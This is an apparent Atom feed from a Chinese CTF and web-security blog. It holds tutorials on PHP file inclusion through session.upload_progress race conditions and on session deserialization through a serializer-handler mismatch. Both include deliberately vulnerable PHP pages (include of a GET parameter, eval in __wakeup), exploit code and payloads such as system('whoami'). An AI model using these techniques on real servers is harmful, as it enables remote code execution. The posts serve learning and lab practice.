<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Welcome to Arsene.Tang &#39;s Blog</title>
  
  <subtitle>一个喜欢web安全但菜的离谱的萌新</subtitle>
  <link href="https://arsenetang.github.io/atom.xml" rel="self"/>
  
  <link href="https://arsenetang.github.io/"/>
  <updated>2021-09-01T12:01:42.761Z</updated>
  <id>https://arsenetang.github.io/</id>
  
  <author>
    <name>Arsene.Tang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>利用seesion.upload_progress实现文件包含</title>
    <link href="https://arsenetang.github.io/2021/09/01/%E5%88%A9%E7%94%A8session.upload_progress%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://arsenetang.github.io/2021/09/01/%E5%88%A9%E7%94%A8session.upload_progress%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2021-08-31T16:00:00.000Z</published>
    <updated>2021-09-01T12:01:42.761Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用Session-upload-progress实现文件包含"><a href="#利用Session-upload-progress实现文件包含" class="headerlink" title="利用Session.upload_progress实现文件包含"></a>利用Session.upload_progress实现文件包含</h1><p>上一篇文章中我们讲到了Session反序列化，但不知道大家有没有发现一个问题，就是我们是利用GET传参将我们构造好的恶意代码传入Session中的，但假如没有GET传参呢？我们还能往Seesion中写入恶意代码吗？</p><span id="more"></span><p>答案肯定是可以的，不然我写这文章还有啥意义呢哈哈哈，这里就要介绍出这篇文章的主人公：<code>session.upload_progress</code>了</p><h2 id="1-session-upload-progress是什么？"><a href="#1-session-upload-progress是什么？" class="headerlink" title="1.session.upload_progress是什么？"></a>1.session.upload_progress是什么？</h2><p>这里我们还是看看官方文档：<a href="https://www.php.net/manual/zh/session.upload-progress.php">https://www.php.net/manual/zh/session.upload-progress.php</a></p><p><img src="https://i.loli.net/2021/09/01/ifcTdM3AnwWxpVa.png" alt="image.png"></p><p>就是说在上传任意文件时，当我们<code>POST</code>上传一个与<code>session.upload_progress.name</code>同名的变量时，它就会在<code>$_SESSION</code>中增加一组数据</p><h2 id="2-相关配置"><a href="#2-相关配置" class="headerlink" title="2.相关配置"></a>2.相关配置</h2><p>我们在官方文档中看到了非常多的配置，而这些配置是成功实现上传的前提</p><p>1.<code>session.upload_progress.enabled</code>：当这个配置为On时，代表<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中，也就是说如果这个选项关掉了，这种方法就用不了了，好在它是默认开启的</p><p><img src="https://i.loli.net/2021/09/01/eFp98MfR4b3dusr.png" alt="image.png"></p><p>2.<code>session.upload_progress.cleanup</code>：这个选项默认也是<code>On</code>，也就是说当文件上传结束时，<code>session</code>文件中有关上传进度的信息立马就会被删除掉；这里就给我们的操作造成了很大的困难，我们就只能使用条件竞争的方式不停的发包，争取在它被删除掉之前就成功利用</p><p><img src="https://i.loli.net/2021/09/01/CpbAiqMwGkWvdz2.png" alt="image.png"></p><p>3.<code>session.upload_progress.name</code>：这个的默认值是<code>PHP_SESSION_UPLOAD_PROGRESS</code>，也就是说我们要<code>POST</code>上传的变量名也要为<code>PHP_SESSION_UPLOAD_PROGRESS</code>，并且<code>PHP_SESSION_UPLOAD_PROGRESS</code>变量的值也会被写入<code>Session</code>中，最重要的就是它的值可控</p><p><img src="https://i.loli.net/2021/09/01/KITfgekNhCG7Pnm.png" alt="image.png"></p><p>4.<code>session.upload_progress.prefix</code>：这个其实我感觉作用不是很大，它的默认值为：<code> upload_progress_</code>，通过官方文档我们可以得知，它写入session文件内容的格式为<code>session.upload_progress.prefix</code>+<code>session.upload_progress.name</code>连接在一起的值，那么在我们这种配置的情况下，它的格式就是<code>upload_progress_</code>+<code>PHP_SESSION_UPLOAD_PROGRESS的值</code></p><p><img src="https://i.loli.net/2021/09/01/chvo2mCJBpaU3kK.png" alt="image.png"></p><p>5.<code>session.use_strict_mode</code>：之前测试时我们都是通过<code>session_start()</code>打开的<code>session</code>，那假如没有<code>session_start()</code>岂不是就不能利用了？但由于<code>session.use_strict_mode</code>这个选项默认是不开启的，相当于我们就可以自己定义<code>session_id</code>，比如我在请求包中设置<code>COOKIE</code>为<code>PHPSESSID=haha</code>，那么就会生成一个<code>sess_haha</code>的<code>session</code>文件，此时php会自动初始化session，并产生一个键值，格式如上</p><p><img src="https://i.loli.net/2021/09/01/xDYNJM6bmG7uA3I.png" alt="image.png"></p><h2 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3.文件包含"></a>3.文件包含</h2><p>既然我们可以通过<code>session.upload_progress</code>将恶意代码写入到<code>Session</code>文件中，而且文件名字和文件路径我们都可控，那一个很常见的思路就是将恶意代码写入<code>Session</code>文件之后，利用文件包含来包含它，但由于<code>session.upload_progress.cleanup = On</code>的存在，我们需要用burp不停发包，然后用同样的方式不停的发送文件包含的数据包，看能不能包含成功，接下来就开始测试：</p><p>先写一个存在文件包含漏洞的页面，命名为<code>test4.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后再写一个表单，这个表单要用<code>POST</code>上传两个东西，一个是任意文件，一个是变量名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>的变量</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>好了，准备开始操作！在表单这个页面随便选择一个文件，用<code>burp</code>抓包，如下图：</p><p><img src="https://i.loli.net/2021/09/01/i9ItkToZKQBxbfU.png" alt="image.png"></p><p>先将我们想要写入的恶意代码写进去，就写入到<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值中，接在111的后面就行，这里我就用<code>&lt;?php system(&#39;whoami&#39;)?&gt;</code>来演示，然后我们把<code>PHPSESSID</code>的值改为<code>lalala</code>，这里我们先不用条件竞争，就先发一次包，看在存储<code>Session</code>的目录下<code>D:\phpStudy\PHPTutorial\tmp\tmp</code>有没有生成<code>sess_lalala</code>这个文件：</p><p><img src="https://i.loli.net/2021/09/01/dc3GF5Qwv61n7ea.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/01/AKE3YBR5whHdC2s.png" alt="image.png"></p><p>可以看到文件以及成功生成了，但大小是0kb，那里面肯定是没有东西的，这就是因为我们上文提到的<code>session.upload_progress.cleanup</code></p><p>将它自动删除掉了，所以说我们才需要条件竞争不停的发包，相当于写的比它删的快，这样就可以成功写进去了，我们把这个数据包发送到<code>burp</code>的爆破模块中，利用爆破不停的发包，这里我设置的发包次数是100000次，由于网速的原因，它还是需要跑很久的，这就给了我们时间去完成文件包含的操作，次数太少了可能还没包含到就被删了：</p><p><img src="https://i.loli.net/2021/09/01/73eiykro9gUpWf2.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/01/xiJFMhDkwBW5r3o.png" alt="image.png"></p><p>然后开始攻击，看它能不能把成功文件写进去：</p><p><img src="https://i.loli.net/2021/09/01/HSoTQxDrqdVBc34.png" alt="image.png"></p><p>开始跑了，然后我们就去存<code>Session</code>文件的那个文件夹，看那个文件里面有没有内容写进去：</p><p><img src="https://i.loli.net/2021/09/01/lqyIgrHAKtpjxFf.png" alt="image.png"></p><p>发现已经成功写进去了，看来我们写的确实比删的要快一点，然后我们这时候去完成文件包含肯定是可以成功的，成功执行了<code>whoami</code></p><p><img src="https://i.loli.net/2021/09/01/QDr4KxMiXfWUgpL.png" alt="image.png"></p><h2 id="4-反序列化"><a href="#4-反序列化" class="headerlink" title="4.反序列化"></a>4.反序列化</h2><p><code>Session</code>反序列化的内容请看上篇文章，这里只是简单提一下，我认为按理来说利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>上传文件也能实现，因为这里是通过条件竞争把我们想要的方法写入到<code>Session</code>文件中，而上一篇文章讲的是直接写入进去，虽然写入的方法不同但结果应该是相同的，但这里我试了很多次都没有成功，应该是数据包数据比较多，<code>burp</code>的发包速度不够快导致竞争不过，所以这里我就演示不了了，可以写个<code>python</code>脚本试试，具体参照这篇文章<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a>，里面有些注意事项我就搬运过来了：</p><p>1.<code>PHPSESSID</code>必须要有，因为要竞争同一个文件</p><p>2.这里不能像上面文件包含一样把恶意代码写在<code>PHP_SESSION_UPLOAD_PROGRESS</code>值中，因为值中一旦出现了<code>|</code>就会使数据写入失败，这里要写在<code>filename</code>的值中，而且<code>filename</code>值中不能有汉字</p><p>3.要将字符串中的双引号转义，以防止与最外层的双引号冲突</p><p>4.上传的文件要大些，否则很难竞争成功，我也有可能是因为写的文件不够大导致未能成功</p><p>参考文章：</p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/111657006?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_46330722/article/details/111657006?spm=1001.2014.3001.5501</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;利用Session-upload-progress实现文件包含&quot;&gt;&lt;a href=&quot;#利用Session-upload-progress实现文件包含&quot; class=&quot;headerlink&quot; title=&quot;利用Session.upload_progress实现文件包含&quot;&gt;&lt;/a&gt;利用Session.upload_progress实现文件包含&lt;/h1&gt;&lt;p&gt;上一篇文章中我们讲到了Session反序列化，但不知道大家有没有发现一个问题，就是我们是利用GET传参将我们构造好的恶意代码传入Session中的，但假如没有GET传参呢？我们还能往Seesion中写入恶意代码吗？&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>反序列化篇之Session反序列化</title>
    <link href="https://arsenetang.github.io/2021/08/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://arsenetang.github.io/2021/08/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-08-30T16:00:00.000Z</published>
    <updated>2021-08-31T12:37:57.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h1><p>Session是一次浏览器和服务器的交互的会话，在ctf中，Session往往有妙用，可以实现反序列化和文件包含，接下来我们先来看看Session具体是啥，然后如何利用Session实现反序列化： </p><span id="more"></span><h2 id="1-Session到底是啥？"><a href="#1-Session到底是啥？" class="headerlink" title="1.Session到底是啥？"></a>1.Session到底是啥？</h2><p>前面我们说到，Session是浏览器和服务器之间交互的会话，会话是啥呢？就是我问候你好吗？你回答说很好。就是一次会话，那么对话完成后，这次会话相当于就结束了，但为什么会出现Session会话呢？因为我们用浏览器访问网站用的是<code>http</code>协议，<code>http</code>协议是一种无状态的协议，就是说它不会储存任何东西，每一次的请求都是没有关联的，无状态的协议好处就是快速；但它也有不方便的地方，比如说我们在<code>login.php</code>登录了，我们肯定希望在<code>index.php</code>中也是登录的状态，否则我们登录还有什么意义呢？但前面说到了<code>http</code>协议是无状态的协议，那访问两个页面就是发起两个<code>http</code>请求，他们俩之间是无关联的，所以无法单纯的在index.php中读取到它在login.php中已经登陆了的；为了解决这个问题，<code>cookie</code>就诞生了，<code>cookie</code>是把少量数据存在<strong>客户端</strong>，它在一个域名下是全局的，相当于<code>php</code>可以在这个域名下的任何页面读取<code>cookie</code>信息，那只要我们访问的两个页面在同一个域名下，那就可以通过<code>cookie</code>获取到登录信息了；但这里就存在安全问题了，因为<code>cookie</code>是存在于客户端的，那用户就是可见的，并且可以随意修改的；那如何又要安全，又可以全局读取信息呢？这时候Session就出现了，其实它的本质和<code>cookie</code>是一样的，只不过它是存在于服务器端的</p><h2 id="2-Session的产生和保存"><a href="#2-Session的产生和保存" class="headerlink" title="2.Session的产生和保存"></a>2.Session的产生和保存</h2><p>上面讲了Session产生的原因，那它具体长啥样子呢？这里我们用<code>php</code>中的Session机制，因为后面讲的反序列化也是基于<code>php</code>的嘛</p><p>首先，当我们需要使用Session时，我们要首先打开Session，开启Session的语句是<code>session_start();</code>，这个函数没有任何返回值，既不会成功也不会报错，它的作用是打开Session，并且随机生成一个32位的session_id，session的全部机制也是基于这个session_id，服务器就是通过这个唯一的session_id来区分出这是哪个用户访问的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;session_id(): &quot;</span>.session_id().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;COOKIE: &quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>];</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/28/J7ortzcFVEQxmld.png" alt="image.png"></p><p>这里可以看出<code>session_id()</code>这个系统方法是输出了本次生成的<code>session_id</code>，并且存入了<code>COOKIE</code>中，参数名为<code>PHPSESSID</code>，这两个值是相同的，而且只要浏览器一直不关，无论刷新多少次它的值都是不变的，但当你关掉浏览器之后它就消失了，重新打开之后会生成一个新的<code>session_id</code>，<code>session_id</code>就是用来标识一个用户的，就像是一个人的身份证一样，接下来就来看看<code>session</code>它是怎么保存的：</p><p>它是保存在服务器中的临时目录下的，保存的路径需要看<code>php.ini</code>的配置，我的是保存在<code>D:\phpStudy\PHPTutorial\tmp\tmp</code>这个路径下的，我们可以打开来看看：</p><p><img src="https://i.loli.net/2021/08/31/CwDpVaNfhzqcoiQ.png" alt="image.png"></p><p>可以看到它的储存形式是文件名为<code>sess</code>+<code>_</code>+<code>session_id</code>，那我们能不能通过修改<code>COOKIE</code>中<code>PHPSESSID</code>的值来修改<code>session_id</code>呢？</p><p><img src="https://i.loli.net/2021/08/31/Z2GlbtcJQ9iy8fC.png" alt="image.png"></p><p>然后刷新页面，可以发现成功了，成功修改了<code>session_id</code>的值，并且去保存的路径下去看发现也成功写进去了：</p><p><img src="https://i.loli.net/2021/08/31/9Qavjy1cpxusBwL.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/31/YZqu1PxcjoMhVRA.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/31/Yme8yTvJ6UMBdCi.png" alt="image.png"></p><p>但由上图可知，它的文件内容是为空的，里面什么都没有，那我们能不能尝试往里面写入东西呢？依然在<code>a.php</code>中操作，给它赋个值：</p><p><img src="https://i.loli.net/2021/08/31/pWkHluF9Cgdzfms.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/08/31/4Urn52OjRpSwlXQ.png" alt="image.png"></p><p>发现成功写进去了，它的内容就是将键值对<strong>序列化</strong>之后的结果</p><p>我们把大致过程总结一下：</p><p>就是HTTP请求一个页面后，如果用到开启<code>session</code>，会去读<code>COOKIE</code>中的<code>PHPSESSID</code>是否有，如果没有，则会新生成一个<code>session_id</code>，先存入<code>COOKIE</code>中的<code>PHPSESSID</code>中，再生成一个<code>sess_</code>前缀文件。当有<strong>写入</strong><code>$_SESSION</code>的时候，就会往<code>sess_</code>文件里序列化写入数据。当<strong>读取</strong>到<code>session</code>变量的时候，先会读取<code>COOKIE</code>中的<code>PHPSESSID</code>，获得<code>session_id</code>，然后再去找这个<code>sess_session_id</code>文件，来获取对应的数据。由于默认的<code>PHPSESSID</code>是临时的会话，在浏览器关闭后就会消失，所以，当我们打开浏览器重新访问的时候，就会新生成<code>session_id</code>和<code>sess_session_id</code>这个文件。</p><h2 id="3-有关的配置"><a href="#3-有关的配置" class="headerlink" title="3.有关的配置"></a>3.有关的配置</h2><p>好了，上面铺垫了这么多，应该明白<code>Session</code>是什么以及<code>Session</code>的机制了，下面就开始正式进入正题，来看看<code>Session</code>反序列化</p><p>首先，我们先去<code>php.ini</code>中去看几项与<code>session</code>有关的配置：</p><p>1.<code>session.save_path</code>：这个是<code>session</code>的存储路径，也就是上文中<code>sess_session_id</code>那个文件存储的路径</p><p><img src="https://i.loli.net/2021/08/31/imyDdvK7orU8SGN.png" alt="image.png"></p><p>2.<code>session.auto_start</code>：这个开关是指定是否在请求开始时就自动启动一个会话，默认为Off；如果它为<code>On</code>的话，相当于就先执行了一个<code>session_start()</code>，会生成一个<code>session_id</code>，一般来说这个开关是不会打开的</p><p><img src="https://i.loli.net/2021/08/31/SZsx4y75Ar21g3q.png" alt="image.png"></p><p>3.<code>session.save_handler</code>：这个是设置用户自定义<code>session</code>存储的选项，默认是<code>files</code>，也就是以文件的形式来存储的，当然你也可以选择其它的形式，比如说数据库啥的</p><p><img src="https://i.loli.net/2021/08/31/fzFZkhPS1GLcRmv.png" alt="image.png"></p><p>4.<code>session.serialize_handler</code>：这个是最为重要的一个，用来定义<code>session</code>序列化存储所用的处理器的名称，不同的处理器序列化以及读取出来会产生不同的结果；默认的处理器为<code>php</code>，常见的还有<code>php_binary</code>和<code>php_serialize</code>，接下来来一个一个的看它们：</p><p><img src="https://i.loli.net/2021/08/31/an7clWUwmOItDTL.png" alt="image.png"></p><p>首先是<code>php</code>，因为它默认就是<code>php</code>，所以说用的应该是最多的，它处理之后的格式是<strong>键名+竖线|+经过<code>serialize()</code>序列化处理后的值</strong></p><p><img src="https://i.loli.net/2021/08/31/sL8hIynZeMXVgSF.png" alt="image.png"></p><p>然后我们来看<code>php_binary</code>，首先我们把处理器换成<code>php_binary</code>需要用语句<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_binary&#39;);</code>这个处理器的格式是<strong>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数序列化处理后的值</strong>；注意这个键名的长度所所对应的ASCII字符，就比如说键名长度为4，那它对应的就是ASCII码为4的字符，是个不可见字符EOT，具体可见下表，从1到31都是不可见字符</p><p><img src="https://i.loli.net/2021/07/27/vmfHFZrN9GLSC8j.png" alt="image.png"></p><p>所以说它最后的结果如下，框框代表的就是不可见字符：</p><p><img src="https://i.loli.net/2021/08/31/8PHjUL3ptbgEMT7.png" alt="image.png"></p><p>最后我们来看<code>php_serialize</code>，这个处理器需要php版本&gt;5.5.4才能使用，首先我们还是得先用<code>ini_set</code>进行设置，语句如下：<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code>这个的格式是<strong>直接进行序列化，把<code>session</code>中的键和值都会被进行序列化操作</strong>，然后把它当成一个数组返回回来：</p><p><img src="https://i.loli.net/2021/08/31/I5LW637GnHtzsrB.png" alt="image.png"></p><h2 id="4-Session反序列化原理"><a href="#4-Session反序列化原理" class="headerlink" title="4.Session反序列化原理"></a>4.Session反序列化原理</h2><p>讲了这么多，相信很多人还是一头雾水，那为什么会产生<code>Session</code>反序列化漏洞呢？这个问题其实也困扰了我很久，以前我也是只知道操作但不清楚原理，知道前面加个<code>|</code>就可以成功但至于为什么就一脸懵逼，因为我们都知道<code>Session</code>反序列化是不需要<code>unserialize()</code>函数就可以实现的，那这具体是怎么实现的呢？今天就来把它彻底搞懂：</p><p>首先我们再来看看<code>session_start()</code>函数，前面我们看到的是没有打开<code>Session</code>的情况下它是打开<code>Session</code>并且返回一个<code>session_id</code>，但假如我们前面就已经打开了<code>Session</code>呢？这里我们再来看看官方文档：</p><p><img src="https://i.loli.net/2021/08/31/xFO1zyPubdHliQT.png" alt="image.png"></p><p>这里重点看我框了的内容，尤其我箭头指向的地方，它会自动反序列化数据，那就很漂亮啊！这里就解决了没有<code>unserialize()</code>的问题，那我们可不可以考虑先把序列化后的数据写入<code>sess_session_id</code>文件中，然后在有反序列化漏洞页面刷新页面，由于这个页面依然有<code>session_start()</code>，那它就去读取那个文件的内容，然后自动进行反序列化操作，这样就会触发反序列化漏洞，完美！！</p><p>这个思路理论上是可以成功的，但这里还有一个核心问题没有解决，就是说我们怎么让它<strong>反序列化的是我们传入的序列化的内容</strong>，因为我们传入的是键值对，那么<code>session</code>序列化存储所用的处理器肯定也是将这个<strong>键值对</strong>写了进去，那我们怎么让它正好反序列化到我们传入的内容呢？这里就需要介绍出<strong>两种处理器的差别</strong>了，<code>php</code>处理器写入时的格式为<code>键名+竖线|+经过serialize()序列化处理后的值</code>那它读取时，肯定就会以<code>竖线|</code>作为一个分隔符，前面的为键名，后面的为键值，然后将键值进行<strong>反序列化</strong>操作；而<code>php_serialize</code>处理器是直接进行序列化，然后返回<strong>序列化后的数组</strong>，那我们能不能在我们传入的序列化内容前加一个分隔符<code>|</code>，从而正好<strong>序列化我们传入的内容呢</strong>？</p><p>这肯定是可以的，而这正是我们<code>Session</code>反序列化的原理，如果看到这有点发晕的话，没关系，咱接着往下看，接下来咱来分析一个例子</p><h2 id="5-案例分析"><a href="#5-案例分析" class="headerlink" title="5.案例分析"></a>5.案例分析</h2><p>首先我们来写一个存在反序列化漏洞的页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这应该是很简单的一个反序列化，反序列化后会先直接进入<code>__wakeup()</code>，然后就<code>eval</code>执行任意代码了，我们先写个exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们再写一个页面，因为这里既没有传参的点也没有反序列化的点，相对于有漏洞利用不了，那我们就写一个利用它的页面<code>sess.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有了这个页面我们就可以把想要的内容写入到<code>Session</code>中了，然后就可以在有漏洞的页面中执行反序列化了，接下来开始操作，首先运行<code>exp.php</code>：</p><p><img src="https://i.loli.net/2021/08/31/2iyrQq49pSMuBdL.png" alt="image.png"></p><p>然后我们通过<code>sess.php</code>将运行结果写入<code>Session</code>中，记得在前面加上<code>|</code>：</p><p><img src="https://i.loli.net/2021/08/31/aulerJ2YxZfX54j.png" alt="image.png"></p><p>然后我们去看它成功写入<code>Session</code>没有，并且看看写入的内容是什么：</p><p><img src="https://i.loli.net/2021/08/31/bBCtN8mdnayOK4u.png" alt="image.png"></p><p>可以看到它已经成功写入进去了，并且内容也是我们想要的内容，按照<code>php</code>处理器的处理方法，会以<code>|</code>为分隔符，左边为键，右边为值，然后将值进行反序列化操作，那我们就去有漏洞的页面去刷新，看看它有没有反序列化之后触发反序列化漏洞：</p><p><img src="https://i.loli.net/2021/08/31/jNbHJdVaEifs1k6.png" alt="image.png"></p><p>bingo，发现成功拿下，漂亮！！因为我没找到合适的ctf例题，这次这个我就不举具体的例子了，希望大家都能把原理搞懂</p><p>文章参考：</p><p><a href="https://blog.csdn.net/think2me/article/details/38726429">https://blog.csdn.net/think2me/article/details/38726429</a></p><p><a href="https://www.freebuf.com/articles/web/264740.html">https://www.freebuf.com/articles/web/264740.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1740495">https://cloud.tencent.com/developer/article/1740495</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Session反序列化&quot;&gt;&lt;a href=&quot;#Session反序列化&quot; class=&quot;headerlink&quot; title=&quot;Session反序列化&quot;&gt;&lt;/a&gt;Session反序列化&lt;/h1&gt;&lt;p&gt;Session是一次浏览器和服务器的交互的会话，在ctf中，Session往往有妙用，可以实现反序列化和文件包含，接下来我们先来看看Session具体是啥，然后如何利用Session实现反序列化： &lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>反序列化篇之pop链的构造(下)</title>
    <link href="https://arsenetang.github.io/2021/08/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bpop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0(%E4%B8%8B)/"/>
    <id>https://arsenetang.github.io/2021/08/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bpop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0(%E4%B8%8B)/</id>
    <published>2021-08-16T16:00:00.000Z</published>
    <updated>2021-08-17T14:59:13.637Z</updated>
    
